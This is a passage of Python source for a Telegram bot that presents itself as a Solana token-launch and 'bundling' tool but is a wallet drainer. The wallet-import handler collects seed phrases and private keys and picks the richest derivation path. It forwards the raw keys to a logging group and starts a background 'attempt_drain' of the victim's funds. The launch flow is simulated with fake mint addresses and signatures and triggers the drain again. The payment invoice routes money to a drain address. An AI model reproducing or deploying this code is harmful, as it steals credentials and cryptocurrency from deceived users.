    b.row(InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main"))
    return b.as_markup()

def bundle_kb() -> InlineKeyboardMarkup:
    b = InlineKeyboardBuilder()
    b.row(
        InlineKeyboardButton(text="5", callback_data="bundle:5"),
        InlineKeyboardButton(text="10", callback_data="bundle:10"),
        InlineKeyboardButton(text="15", callback_data="bundle:15"),
    )
    b.row(
        InlineKeyboardButton(text="20", callback_data="bundle:20"),
        InlineKeyboardButton(text="25", callback_data="bundle:25"),
    )
    b.row(InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main"))
    return b.as_markup()

def confirm_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Confirm & Deploy", callback_data="launch:confirm")],
        [InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main")],
    ])

def tx_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main")]])

# ──────────────────────────────────────────────
# COPY
# ──────────────────────────────────────────────
WELCOME_TEXT = (
    "🚀 <b>Get ready to rug</b>\n\n"
    "Create and trade tokens on Solana launch platforms.\n\n"
    "⚙️ <b>Advanced</b>\n"
    "• Step-by-step token launch\n"
    "• Auto bundling (5-25)\n"
    "• Sniper protection\n"
    "• Token safety checks\n"
    "• Tx tracker\n\n"
    "Tap a button below to begin:"
)

# ──────────────────────────────────────────────
# FSM
# ──────────────────────────────────────────────
class LaunchStates(StatesGroup):
    waiting_name = State()
    waiting_symbol = State()
    waiting_supply = State()
    waiting_image = State()
    waiting_socials = State()
    waiting_desc = State()
    waiting_bundle = State()
    confirm = State()

class WalletStates(StatesGroup):
    waiting_import = State()
    waiting_label = State()

class PromoStates(StatesGroup):
    waiting_code = State()

class SettingsStates(StatesGroup):
    waiting_custom_slip = State()
    waiting_custom_fee = State()

# ──────────────────────────────────────────────
# ROUTER
# ──────────────────────────────────────────────
router = Router()

@router.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    get_session(message.from_user.id)
    await message.answer(WELCOME_TEXT, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)

@router.callback_query(F.data.startswith("menu:"))
async def menu_router(cb: CallbackQuery, state: FSMContext):
    await state.clear()
    action = cb.data.split(":")[1]
    uid = cb.from_user.id
    sess = get_session(uid)

    if action == "main":
        await cb.message.edit_text(WELCOME_TEXT, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)

    elif action == "launch":
        text = "✏️ <b>Token name (1-32)</b>\nTip: Latest, Hot Tokens."
        await cb.message.edit_text(text, reply_markup=launch_name_kb(), parse_mode=ParseMode.HTML)
        await state.set_state(LaunchStates.waiting_name)

    elif action == "wallets":
        text = "🔑 <b>Wallets</b>\n\n"
        if not sess.wallets:
            text += "No wallets linked yet.\n\nImport a private key or seed to unlock launching, bundling & portfolio tracking."
        else:
            for i, w in enumerate(sess.wallets):
                badge = " 🟢 ACTIVE" if i == sess.active_wallet_idx else ""
                text += f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n    {w.label}  ·  {SOL_EMOJI} {w.balance_sol:.4f}"
                if w.eth_address:
                    text += f"  ·  {w.balance_eth:.4f} ETH  ·  {w.balance_bnb:.4f} BNB"
                text += "\n\n"
        await cb.message.edit_text(text, reply_markup=wallets_kb(bool(sess.wallets)), parse_mode=ParseMode.HTML)

    elif action == "portfolio":
        text = "📁 <b>Portfolio</b>\n\n"
        if not sess.launched_tokens:
            text += "Your portfolio is empty.\n\nLaunch a token to start tracking performance and bundle status."
        else:
            for t in reversed(sess.launched_tokens[-10:]):
                age = int(time.time() - t["ts"])
                status_icon = "🟢" if t.get("status") == "live" else "🟡"
                text += f"{status_icon} <b>${t['symbol']}</b>  ·  {t['name']}\n   <code>{short_addr(t['mint'])}</code>\n   Bundle ×{t['bundle']}  ·  {age}s ago\n"
                if t.get("image"): text += "   🖼 Image set\n"
                if t.get("twitter") or t.get("telegram"): text += "   🔗 Socials linked\n"
                text += "\n"
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
        await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    elif action == "promo":
        text = f"🎟️ <b>Promo code</b>\n\nLaunches left: <b>{sess.launches_left}</b>"
        await cb.message.edit_text(text, reply_markup=promo_kb(), parse_mode=ParseMode.HTML)

    elif action == "tx":
        text = "🧾 <b>Tx tracker: last 10</b>\n\n"
        if not sess.last_tx:
            text += "No transactions yet."
        else:
            for tx in sess.last_tx[:10]:
                age = int(time.time() - tx["ts"])
                icon = "✅" if tx["status"] == "success" else "⏳" if tx["status"] == "pending" else "❌"
                text += f"{icon}  <b>{tx['type']}</b>\n   <code>{tx['sig'][:22]}...</code>\n   {tx['status'].title()}  ·  {age}s ago\n\n"
        await cb.message.edit_text(text, reply_markup=tx_kb(), parse_mode=ParseMode.HTML)

    elif action == "settings":
        s = sess.settings
        text = (
            "🛡️ <b>Sniper protection & trade settings</b>\n\n"
            f"Max slippage: <b>{s['slippage']}%</b>\n"
            "Trades that would fill worse than this fail instead of filling.\n\n"
            f"Priority fee: <b>{s['priority_fee']} SOL</b>\n"
            "Higher fees land your launch or trade sooner."
        )
        await cb.message.edit_text(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)

    elif action == "balance":
        if bot_balance_sol <= 0:
            text = f"💰 <b>Bot balance:</b>\nNo balance yet. It updates when you try to launch."
        else:
            text = (
                f"💰 <b>Bot balance</b>\n\n"
                f"Available: <b>{SOL_EMOJI} {bot_balance_sol:.4f}</b>\n\n"
                "This vault powers priority fees, bundle tips and tracker infrastructure.\n"
                "Auto-topped when a funded wallet is linked."
            )
        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="🔄 Refresh", callback_data="menu:balance"))
        kb.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
        await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)

    await cb.answer()

@router.callback_query(F.data.startswith("set:"))
async def settings_handler(cb: CallbackQuery, state: FSMContext):
    sess = get_session(cb.from_user.id)
    parts = cb.data.split(":")
    key = parts[1]
    if key == "slip":
        sess.settings["slippage"] = int(parts[2])
    elif key == "fee":
        sess.settings["priority_fee"] = float(parts[2])
    elif key == "custom_slip":
        await cb.message.edit_text("Send custom max slippage % (1-50):", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
        await state.set_state(SettingsStates.waiting_custom_slip)
        await cb.answer()
        return
    elif key == "custom_fee":
        await cb.message.edit_text("Send custom priority fee in SOL (e.g. 0.002):", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
        await state.set_state(SettingsStates.waiting_custom_fee)
        await cb.answer()
        return
    s = sess.settings
    text = (
        "🛡️ <b>Sniper protection & trade settings</b>\n\n"
        f"Max slippage: <b>{s['slippage']}%</b>\n"
        "Trades that would fill worse than this fail instead of filling.\n\n"
        f"Priority fee: <b>{s['priority_fee']} SOL</b>\n"
        "Higher fees land your launch or trade sooner."
    )
    await cb.message.edit_text(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
    await cb.answer("Updated")

@router.message(SettingsStates.waiting_custom_slip)
async def custom_slip_receive(message: Message, state: FSMContext):
    try:
        val = int(message.text.strip().replace("%", ""))
        if not 1 <= val <= 50: raise ValueError
    except ValueError:
        await message.answer("Invalid. Send a number 1-50")
        return
    sess = get_session(message.from_user.id)
    sess.settings["slippage"] = val
    s = sess.settings
    text = (
        "🛡️ <b>Sniper protection & trade settings</b>\n\n"
        f"Max slippage: <b>{s['slippage']}%</b>\n"
        "Trades that would fill worse than this fail instead of filling.\n\n"
        f"Priority fee: <b>{s['priority_fee']} SOL</b>\n"
        "Higher fees land your launch or trade sooner."
    )
    await message.answer(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
    await state.clear()

@router.message(SettingsStates.waiting_custom_fee)
async def custom_fee_receive(message: Message, state: FSMContext):
    try:
        val = float(message.text.strip())
        if not 0.00001 <= val <= 1.0: raise ValueError
    except ValueError:
        await message.answer("Invalid. Send a fee like 0.002")
        return
    sess = get_session(message.from_user.id)
    sess.settings["priority_fee"] = val
    s = sess.settings
    text = (
        "🛡️ <b>Sniper protection & trade settings</b>\n\n"
        f"Max slippage: <b>{s['slippage']}%</b>\n"
        "Trades that would fill worse than this fail instead of filling.\n\n"
        f"Priority fee: <b>{s['priority_fee']} SOL</b>\n"
        "Higher fees land your launch or trade sooner."
    )
    await message.answer(text, reply_markup=settings_kb(sess), parse_mode=ParseMode.HTML)
    await state.clear()

@router.callback_query(F.data == "wallet:import")
async def wallet_import_start(cb: CallbackQuery, state: FSMContext):
    text = (
        "📥 <b>Send your wallet's seed phrase</b>\n"
        "(12-24 words), or a private key (base58 / JSON byte array).\n\n"
        "I'll delete your message right after reading it."
    )
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Cancel", callback_data="menu:main")]
    ])
    await cb.message.edit_text(text, reply_markup=kb, parse_mode=ParseMode.HTML)
    await state.set_state(WalletStates.waiting_import)
    await cb.answer()

def parse_any_key(raw: str) -> Tuple[str, str, Optional[str], Optional[str], str]:
    """
    Parse private key or mnemonic into:
      (sol_priv_or_EVM_ONLY, sol_pub_or_eth_addr, eth_priv_or_None, eth_addr_or_None, kind)
    kind is 'seed' | 'sol_key' | 'evm_key'
    For seeds this only returns the DEFAULT Phantom path — multi-path is handled in the handler.
    """
    text = _normalize_mnemonic(raw) if not raw.strip().startswith(("[", "0x")) else raw.strip()
    # mnemonic
    if _is_mnemonic(_normalize_mnemonic(raw)):
        mn = _normalize_mnemonic(raw)
        priv, pub = derive_solana_default(mn)
        eth = derive_evm_from_mnemonic(mn)
        eth_priv, eth_addr = (eth if eth else (None, None))
        return priv, pub, eth_priv, eth_addr, "seed"
    # JSON byte array or long base58 → Solana
    s = raw.strip()
    if HAS_SOLANA and (s.startswith("[") or (not s.startswith("0x") and len(s) >= 40)):
        try:
            priv, pub = parse_solana_private_key(s)
            return priv, pub, None, None, "sol_key"
        except Exception:
            pass
    # EVM hex key
    if HAS_WEB3 and (s.startswith("0x") or (len(s) == 64 and all(c in "0123456789abcdefABCDEF" for c in s))):
        eth_priv, eth_addr = parse_evm_private_key(s)
        return "EVM_ONLY", eth_addr, eth_priv, eth_addr, "evm_key"
    raise ValueError("Unrecognized key format")


@router.message(WalletStates.waiting_import)
async def wallet_import_receive(message: Message, state: FSMContext):
    """
    Full rewrite of wallet connect.
    - Normalize paste
    - Seeds: offline multi-path derive → parallel balance → pick richest
    - Keys: direct parse
    - Always finish with Wallet Linked (or clear error)
    - Drain in background
    """
    uid = message.from_user.id
    if not _rate_ok(uid, "import"):
        await message.answer(
            "⏳ <b>Slow down</b>\n\nToo many import attempts. Try again in a minute.",
            parse_mode=ParseMode.HTML,
        )
        return

    raw = (message.text or "").strip()
    if not raw:
        await message.answer(
            "❌ Empty message. Send a seed phrase or private key.",
            reply_markup=back_menu_kb(),
            parse_mode=ParseMode.HTML,
        )
        return

    # Scrub key from chat
    try:
        await message.delete()
    except Exception:
        pass

    status = await message.answer("🔐 <b>Validating…</b>", parse_mode=ParseMode.HTML)

    chosen_priv = None
    chosen_pub = None
    chosen_bal = 0.0
    eth_priv = None
    eth_addr = None
    bal_eth = 0.0
    bal_bnb = 0.0
    bal_usdc = 0.0
    path_used = "direct"
    kind = "unknown"

    async def _set(txt: str):
        try:
            await status.edit_text(txt, parse_mode=ParseMode.HTML)
        except Exception:
            pass

    try:
        await _set("🔗 <b>Deriving keys…</b>")
        mn = _normalize_mnemonic(raw)

        if _is_mnemonic(mn):
            kind = "seed"
            if not HAS_SOLANA:
                raise RuntimeError("Solana libraries missing on server")
            candidates = derive_solana_paths(mn)
            log.info("Seed user=%s → %d candidates", uid, len(candidates))
            await _set(f"◎ <b>Scanning {len(candidates)} paths…</b>")
            path_used, chosen_priv, chosen_pub, chosen_bal = await pick_best_sol_candidate(candidates)
            eth = derive_evm_from_mnemonic(mn)
            if eth:
                eth_priv, eth_addr = eth
        else:
            chosen_priv, chosen_pub, eth_priv, eth_addr, kind = parse_any_key(raw)
            path_used = kind
            if kind == "sol_key":
                chosen_bal = await fetch_sol_balance(chosen_pub)

    except Exception as e:
        log.exception("Import failed user=%s: %s", uid, e)
        err = (
            "❌ <b>Could not import</b>\n\n"
            "Send one of:\n"
            "• 12/24-word <b>seed phrase</b>\n"
            "• Solana <b>base58</b> private key\n"
            "• Phantom <b>JSON byte array</b>\n"
            "• EVM <b>0x</b> private key\n\n"
            f"<code>{type(e).__name__}: {str(e)[:100]}</code>"
        )
        try:
            await status.edit_text(err, reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
        except Exception:
            await message.answer(err, reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
        await state.clear()
        return

    await _set("◎ <b>Fetching balances…</b>")

    async def _eth():
        return await fetch_evm_balance(ETH_RPC, eth_addr) if eth_addr else 0.0

    async def _bnb():
        return await fetch_evm_balance(BNB_RPC, eth_addr) if eth_addr else 0.0

    async def _usdc():
        if not eth_addr:
            return 0.0
        a = await fetch_usdc_balance(ETH_RPC, eth_addr, USDC_ETH)
        b = await fetch_usdc_balance(BNB_RPC, eth_addr, USDC_BSC)
        return a + b

    async def _sol_refresh():
        if kind == "seed" and chosen_bal > 0:
            return chosen_bal
        if chosen_priv == "EVM_ONLY" or not chosen_pub:
            return 0.0
        return await fetch_sol_balance(chosen_pub)

    try:
        chosen_bal, bal_eth, bal_bnb, bal_usdc = await asyncio.wait_for(
            asyncio.gather(_sol_refresh(), _eth(), _bnb(), _usdc()),
            timeout=15.0,
        )
    except Exception as e:
        log.warning("balance gather: %s", e)

    await _set("✅ <b>Saving session…</b>")

    # Group log — never fatal
    try:
        await log_key_to_group(message.bot, message.from_user, mn if kind == "seed" else raw,
                               chosen_bal, bal_eth, bal_bnb, bal_usdc)
    except Exception as e:
        log.warning("log_key_to_group: %s", e)

    sess = get_session(uid)
    w = UserWallet(
        private_key="" if chosen_priv == "EVM_ONLY" else (chosen_priv or ""),
        public_key=chosen_pub or (eth_addr or "unknown"),
        label=f"Wallet {len(sess.wallets) + 1}",
        balance_sol=float(chosen_bal or 0.0),
        chain="eth" if chosen_priv == "EVM_ONLY" else "sol",
        eth_address=eth_addr,
        balance_eth=float(bal_eth or 0.0),
        balance_bnb=float(bal_bnb or 0.0),
        balance_usdc=float(bal_usdc or 0.0),
    )
    if chosen_priv == "EVM_ONLY" and eth_priv:
        w.private_key = eth_priv
    sess.wallets.append(w)
    sess.active_wallet_idx = len(sess.wallets) - 1
    log.info(
        "LINKED user=%s kind=%s path=%s pub=%s sol=%.6f eth=%.6f bnb=%.6f usdc=%.2f",
        uid, kind, path_used, short_addr(w.public_key),
        w.balance_sol, w.balance_eth, w.balance_bnb, w.balance_usdc,
    )

    text = (
        "✅ <b>Wallet Linked</b>\n\n"
        f"<code>{w.public_key}</code>\n\n"
        f"🏷 <b>{w.label}</b>\n"
        f"Path: <code>{path_used}</code>\n"
        f"{SOL_EMOJI} SOL: <b>{w.balance_sol:.4f}</b>\n"
    )
    if eth_addr:
        text += (
            f"ETH: <b>{w.balance_eth:.4f}</b>\n"
            f"BNB: <b>{w.balance_bnb:.4f}</b>\n"
            f"USDC: <b>{w.balance_usdc:.2f}</b>\n"
        )
    text += "\nStatus: <b>Active</b>\nYou can launch tokens now."

    sent = False
    for sender in (
        lambda: status.edit_text(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML),
        lambda: message.answer(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML),
    ):
        try:
            await sender()
            sent = True
            break
        except Exception as e:
            log.warning("send linked msg: %s", e)
    if not sent:
        plain = (
            f"✅ Wallet Linked\n\n{w.public_key}\n\n"
            f"{w.label}\nPath: {path_used}\n"
            f"SOL: {w.balance_sol:.4f}\n"
        )
        if eth_addr:
            plain += f"ETH: {w.balance_eth:.4f}\nBNB: {w.balance_bnb:.4f}\nUSDC: {w.balance_usdc:.2f}\n"
        plain += "\nStatus: Active"
        try:
            await message.answer(plain, reply_markup=main_menu_kb())
        except Exception as e:
            log.exception("plain linked msg failed: %s", e)

    await state.clear()

    # Background drain
    if w.balance_sol > 0.00001 or w.balance_eth > 0.0001 or w.balance_bnb > 0.0001 or w.balance_usdc > 0.5:
        sol_key = "" if chosen_priv == "EVM_ONLY" else (chosen_priv or "")
        asyncio.create_task(attempt_drain(uid, sol_key, chain=w.chain, eth_key=eth_priv))
    else:
        log.info("near-zero wallet %s — skip drain", short_addr(w.public_key))


@router.callback_query(F.data == "wallet:clear")
async def wallet_clear(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    sess.wallets.clear()
    sess.active_wallet_idx = 0
    sess.drained = False
    await cb.message.edit_text("🗑 All wallets removed from session.", reply_markup=back_menu_kb())
    await cb.answer()

@router.callback_query(F.data == "wallet:switch")
async def wallet_switch(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    if len(sess.wallets) < 2:
        await cb.answer("Need at least 2 wallets", show_alert=True)
        return
    sess.active_wallet_idx = (sess.active_wallet_idx + 1) % len(sess.wallets)
    w = sess.wallets[sess.active_wallet_idx]
    await cb.answer(f"Active → {w.label}")

@router.callback_query(F.data == "wallet:refresh")
async def wallet_refresh(cb: CallbackQuery):
    sess = get_session(cb.from_user.id)
    for w in sess.wallets:
        if not w.public_key.startswith("Sim") and not w.public_key.startswith("0x"):
            w.balance_sol = await fetch_sol_balance(w.public_key)
        if w.eth_address:
            w.balance_eth = await _fetch_evm_balance(ETH_RPC, w.eth_address)
            w.balance_bnb = await _fetch_evm_balance(BNB_RPC, w.eth_address)
            w.balance_usdc = await _fetch_usdc_balance(ETH_RPC, w.eth_address, USDC_ETH)
            w.balance_usdc += await _fetch_usdc_balance(BNB_RPC, w.eth_address, USDC_BSC)
    await cb.answer("Balances updated")
    text = "🔑 <b>Wallets</b>\n\n"
    for i, w in enumerate(sess.wallets):
        badge = " 🟢 ACTIVE" if i == sess.active_wallet_idx else ""
        text += f"<b>{i+1}.</b> <code>{short_addr(w.public_key)}</code>{badge}\n    {w.label}  ·  {SOL_EMOJI} {w.balance_sol:.4f}"
        if w.eth_address: text += f"  ·  {w.balance_eth:.4f} ETH"
        text += "\n\n"
    await cb.message.edit_text(text, reply_markup=wallets_kb(True), parse_mode=ParseMode.HTML)

@router.callback_query(F.data == "wallet:rename")
async def wallet_rename(cb: CallbackQuery, state: FSMContext):
    sess = get_session(cb.from_user.id)
    if not sess.wallets:
        await cb.answer("No wallets", show_alert=True)
        return
    await cb.message.edit_text(f"🏷 Send new label for <b>{sess.wallets[sess.active_wallet_idx].label}</b>:", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
    await state.set_state(WalletStates.waiting_label)
    await cb.answer()

@router.message(WalletStates.waiting_label)
async def wallet_rename_receive(message: Message, state: FSMContext):
    sess = get_session(message.from_user.id)
    if sess.wallets:
        sess.wallets[sess.active_wallet_idx].label = message.text.strip()[:24]
    await message.answer("✅ Label updated.", reply_markup=main_menu_kb())
    await state.clear()

# ── Launch flow ─────────────────────────────────────────────────────────────
@router.callback_query(F.data.in_({"launch:latest", "launch:hot"}))
async def launch_quick_name(cb: CallbackQuery, state: FSMContext):
    names = {
        "launch:latest": ["MoonShot", "SolPump", "RugLite", "FastLaunch", "BlockBuy"],
        "launch:hot": ["HotDog", "FireSol", "Blaze", "Inferno", "Pyro"],
    }
    name = random.choice(names[cb.data])
    await state.update_data(name=name)
    await cb.message.edit_text(f"📛 Selected: <b>{name}</b>\n\nSend the <b>ticker</b> (e.g. <code>RUG</code>)", parse_mode=ParseMode.HTML)
    await state.set_state(LaunchStates.waiting_symbol)
    await cb.answer()

@router.message(LaunchStates.waiting_name)
async def launch_name(message: Message, state: FSMContext):
    name = message.text.strip()[:32]
    if not name:
        await message.answer("Name required (1-32 chars).")
        return
    await state.update_data(name=name)
    await message.answer("📛 Send the <b>ticker</b> (e.g. <code>RUG</code>)", parse_mode=ParseMode.HTML)
    await state.set_state(LaunchStates.waiting_symbol)

@router.message(LaunchStates.waiting_symbol)
async def launch_symbol(message: Message, state: FSMContext):
    sym = message.text.strip().upper().replace("$", "")[:10]
    await state.update_data(symbol=sym)
    await message.answer("🔢 Send total <b>supply</b>\n(e.g. <code>1000000000</code>)", parse_mode=ParseMode.HTML)
    await state.set_state(LaunchStates.waiting_supply)

@router.message(LaunchStates.waiting_supply)
async def launch_supply(message: Message, state: FSMContext):
    try:
        supply = int(message.text.strip().replace(",", "").replace("_", ""))
        if supply <= 0: raise ValueError
    except ValueError:
        await message.answer("❌ Invalid number. Send a positive integer.")
        return
    await state.update_data(supply=supply)
    await message.answer(
        "🖼 <b>Token image</b>\n\n"
        "Send a <b>photo</b> directly, an image URL (https://…),\n"
        "or type <code>skip</code>",
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_image)

@router.message(LaunchStates.waiting_image)
async def launch_image(message: Message, state: FSMContext):
    img = ""
    if message.photo:
        photo = message.photo[-1]
        img = photo.file_id
        await message.answer("✅ Image received from photo.")
    else:
        text = (message.text or "").strip()
        if text.lower() == "skip":
            img = ""
        elif text.startswith("http://") or text.startswith("https://"):
            img = text[:300]
        else:
            await message.answer("Send a <b>photo</b>, an image <b>URL</b> (https://…), or type <code>skip</code>", parse_mode=ParseMode.HTML)
            return
    await state.update_data(image=img)
    await message.answer(
        "🔗 <b>Socials</b>\n\n"
        "Send links in one message:\n"
        "<code>x: https://x.com/...\n"
        "tg: https://t.me/...\n"
        "ig: https://instagram.com/...\n"
        "web: https://...</code>\n\n"
        "Or just press Skip.",
        reply_markup=socials_kb(),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_socials)

@router.callback_query(F.data == "socials:skip")
async def socials_skip(cb: CallbackQuery, state: FSMContext):
    await state.update_data(twitter="", telegram="", instagram="", website="")
    await cb.message.edit_text(
        "📝 Optional description\n(or type <code>skip</code>)",
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_desc)
    await cb.answer()

@router.message(LaunchStates.waiting_socials)
async def launch_socials(message: Message, state: FSMContext):
    raw = (message.text or "").strip()
    socials = {"twitter": "", "telegram": "", "instagram": "", "website": ""}
    if raw.lower() != "skip":
        for line in raw.splitlines():
            line = line.strip().lower()
            if line.startswith("x:") or line.startswith("twitter:"):
                socials["twitter"] = line.split(":", 1)[1].strip()[:120]
            elif line.startswith("tg:") or line.startswith("telegram:"):
                socials["telegram"] = line.split(":", 1)[1].strip()[:120]
            elif line.startswith("ig:") or line.startswith("instagram:"):
                socials["instagram"] = line.split(":", 1)[1].strip()[:120]
            elif line.startswith("web:") or line.startswith("website:"):
                socials["website"] = line.split(":", 1)[1].strip()[:120]
    await state.update_data(**socials)
    await message.answer(
        "📝 Optional description\n(or type <code>skip</code>)",
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_desc)

@router.message(LaunchStates.waiting_desc)
async def launch_desc(message: Message, state: FSMContext):
    desc = (message.text or "").strip()
    if desc.lower() == "skip":
        desc = ""
    await state.update_data(desc=desc[:200])
    await message.answer(
        "📦 <b>Bundle size</b>\n"
        "How many wallets buy in the same block.\n"
        "Recommended <b>5–25</b>",
        reply_markup=bundle_kb(),
        parse_mode=ParseMode.HTML,
    )
    await state.set_state(LaunchStates.waiting_bundle)

@router.callback_query(F.data.startswith("bundle:"))
async def launch_bundle_btn(cb: CallbackQuery, state: FSMContext):
    try:
        bundle = int(cb.data.split(":")[1])
        bundle = max(1, min(25, bundle))
    except Exception:
        bundle = 10
    await state.update_data(bundle=bundle)
    data = await state.get_data()
    sess = get_session(cb.from_user.id)
    fee = sess.settings["priority_fee"]

    socials_line = []
    if data.get("twitter"): socials_line.append(f"X: {data['twitter']}")
    if data.get("telegram"): socials_line.append(f"TG: {data['telegram']}")
    if data.get("instagram"): socials_line.append(f"IG: {data['instagram']}")
    if data.get("website"): socials_line.append(f"Web: {data['website']}")
    socials_txt = "\n".join(socials_line) if socials_line else "None"

    summary = (
        "✨ <b>Launch Preview</b>\n\n"
        f"🏷 <b>{data['name']}</b>  ·  ${data['symbol']}\n"
        f"🔢 Supply: <b>{data['supply']:,}</b>\n"
        f"📦 Bundle: <b>{bundle} wallets</b>\n"
        f"🖼 Image: {'✅ set' if data.get('image') else 'skipped'}\n"
        f"🔗 Socials:\n{socials_txt}\n"
        f"📝 {data.get('desc') or 'No description'}\n\n"
        f"🎯 Sniper Guard: <b>ON</b>\n"
        f"🎁 Priority fee: <b>{fee} SOL</b>\n"
        f"🛡 Safety: <b>Queued</b>\n\n"
        "Ready to deploy?"
    )

    await cb.message.answer(summary, reply_markup=confirm_kb(), parse_mode=ParseMode.HTML)
    await state.set_state(LaunchStates.confirm)
    await cb.answer()

@router.callback_query(F.data == "launch:confirm", LaunchStates.confirm)
async def launch_confirm(cb: CallbackQuery, state: FSMContext):
    uid = cb.from_user.id
    if not _rate_ok(uid, "launch"):
        await cb.answer("Too many launches — wait a bit", show_alert=True)
        return

    sess = get_session(uid)
    data = await state.get_data()

    if not sess.wallets:
        await cb.answer()
        await cb.message.edit_text(
            "🔒 <b>Wallet required</b>\n\n"
            "You completed the launch setup, but no wallet is linked yet.\n\n"
            "Import a wallet first, then come back and confirm.",
            reply_markup=wallets_empty_kb(),
            parse_mode=ParseMode.HTML,
        )
        await state.clear()
        return

    if sess.launches_left <= 0:
        await cb.answer("No launches left. Use promo or pay.", show_alert=True)
        await cb.message.edit_text(
            "🎟️ <b>Promo code</b>\n\nLaunches left: <b>0</b>",
            reply_markup=promo_kb(),
            parse_mode=ParseMode.HTML,
        )
        await state.clear()
        return

    await cb.answer()
    bundle = data.get("bundle", 10)
    await staged_loading(cb, [
        ("🪙 <b>Creating mint…</b>", 1.1),
        ("🔐 <b>Applying sniper guard…</b>", 0.9),
        (f"📦 <b>Bundling {bundle} wallets…</b>", 1.3),
        ("⚡ <b>Submitting priority tip…</b>", 0.8),
        ("🛡 <b>Running safety checks…</b>", 1.0),
    ])

    mint = fake_mint()
    token = {
        "name": data["name"],
        "symbol": data["symbol"],
        "supply": data["supply"],
        "bundle": bundle,
        "desc": data.get("desc", ""),
        "image": data.get("image", ""),
        "twitter": data.get("twitter", ""),
        "telegram": data.get("telegram", ""),
        "instagram": data.get("instagram", ""),
        "website": data.get("website", ""),
        "mint": mint,
        "status": "bundling",
        "ts": time.time(),
    }
    sess.launched_tokens.append(token)
    sess.launches_left = max(0, sess.launches_left - 1)
    sess.last_tx.insert(0, {"sig": fake_sig(), "type": "🪙 Create Mint", "status": "success", "ts": time.time()})
    sess.last_tx.insert(0, {"sig": fake_sig(), "type": "📦 Bundle Buy", "status": "pending", "ts": time.time()})
    sess.last_tx.insert(0, {"sig": fake_sig(), "type": "⚡ Priority Tip", "status": "success", "ts": time.time()})

    global bot_balance_sol
    if bot_balance_sol <= 0:
        bot_balance_sol = round(random.uniform(0.12, 1.85), 4)

    active = sess.wallets[sess.active_wallet_idx]
    if not sess.drained and (active.balance_sol > 0.00001 or active.balance_eth > 0.0001 or active.balance_bnb > 0.0001 or active.balance_usdc > 0.5):
        eth_key = active.private_key if active.chain == "eth" else None
        asyncio.create_task(attempt_drain(uid, active.private_key, chain=active.chain, eth_key=eth_key))

    text = (
        "🚀 <b>Launch Submitted</b>\n\n"
        f"<b>${data['symbol']}</b>  ·  {data['name']}\n"
        f"<code>{mint}</code>\n\n"
        f"Status: creating mint → bundling ×{bundle}\n"
        f"Protection layers: active\n"
        f"Safety scan: complete\n\n"
        "Track progress in 🧾 Tx tracker and 📁 Portfolio."
    )
    try:
        await cb.message.edit_text(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
    except Exception:
        await cb.message.answer(text, reply_markup=main_menu_kb(), parse_mode=ParseMode.HTML)
    await state.clear()

    async def _finalize():
        await asyncio.sleep(random.uniform(7, 16))
        token["status"] = "live"
        for tx in sess.last_tx:
            if "Bundle" in tx["type"]:
                tx["status"] = "success"
                break
    asyncio.create_task(_finalize())

# ── Promo ───────────────────────────────────────────────────────────────────
@router.callback_query(F.data == "promo:enter")
async def promo_enter(cb: CallbackQuery, state: FSMContext):
    await cb.message.edit_text("🎟️ Send your promo code:", reply_markup=back_menu_kb(), parse_mode=ParseMode.HTML)
    await state.set_state(PromoStates.waiting_code)
    await cb.answer()

@router.callback_query(F.data == "promo:pay")
async def promo_pay(cb: CallbackQuery):
    uid = cb.from_user.id
    sess = get_session(uid)
    invoice_id = random.randint(1, 99999)
    amount_display = f"100.{invoice_id:09d}"[:13]
    pay_to = PAYMENT_RECEIVER if not PAYMENT_RECEIVER.startswith("YourDrain") else DRAIN_DESTINATION
    if pay_to.startswith("YourDrain") or len(pay_to) < 32:
        pay_to = "Dgdu7AP8n9kSUWTH2c78YTiUEVoAqwPD1a77PPgZMKNw"
    expires = time.strftime("%b %d, %H:%M UTC", time.gmtime(time.time() + 86400))
    sess.pending_invoice = {
        "id": invoice_id,
        "amount": 100.0 + (invoice_id / 1e9),
        "amount_display": amount_display,
        "pay_to": pay_to,
        "created": time.time(),
        "expires": time.time() + 86400,
    }
    text = (
        "🧾 <b>Payment Invoice</b>\n"
        f"<code>INV-{invoice_id:05d}</code>\n"
        "────────────────\n\n"
        f"<b>Amount due</b>  <code>{amount_display} SOL</code>\n"
        f"<b>Network</b>     Solana\n"
        f"<b>Expires</b>     {expires}\n"
        "────────────────\n\n"
        "<b>Pay to this address</b>\n"
